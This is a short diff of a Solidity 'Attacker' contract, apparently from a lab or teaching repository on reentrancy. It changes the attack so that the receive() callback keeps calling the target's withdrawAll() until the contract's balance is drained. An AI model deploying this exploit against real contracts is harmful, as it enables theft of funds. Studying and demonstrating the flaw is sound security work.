@@ -5,7 +5,6 @@ import { Reentrancy } from "./Reentrancy.sol";
 
 contract Attacker {
     Reentrancy public target;
-    uint256 public amount;
 
     constructor(address _target) {
         target = Reentrancy(_target);
@@ -13,7 +12,7 @@ contract Attacker {
 
     receive() external payable {
         if (address(target).balance > 0) {
-            target.withdraw(amount);
+            target.withdrawAll();
         }
     }
 
@@ -21,8 +20,7 @@ contract Attacker {
         target.deposit{ value: msg.value }();
     }
 
-    function attack(uint256 _amount) public payable {
-        amount = _amount;
-        target.withdraw(_amount);
+    function attack() public payable {
+        target.withdrawAll();
     }
 }
